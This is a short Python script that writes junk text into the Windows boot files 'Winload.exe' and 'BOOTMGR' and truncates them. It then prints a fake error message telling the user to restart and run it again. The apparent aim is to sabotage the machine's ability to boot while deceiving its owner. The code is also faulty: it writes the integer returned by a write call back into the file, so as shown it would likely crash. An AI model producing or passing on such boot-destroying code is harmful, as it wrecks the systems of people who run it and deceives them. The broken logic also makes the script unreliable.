filename = "Winload.exe"

with open(filename, 'r+') as f:
    text = f.read()
    text = f.write('Boot has been sat')
    f.seek(0)
    f.write(text)
    f.truncate()

filename = "BOOTMGR"

with open(filename, 'r+') as f:
    text = f.read()
    text = f.write('Boot has been sat')
    f.seek(0)
    f.write(text)
    f.truncate()

print('We have detected an error. Please restart your system and run this again!')
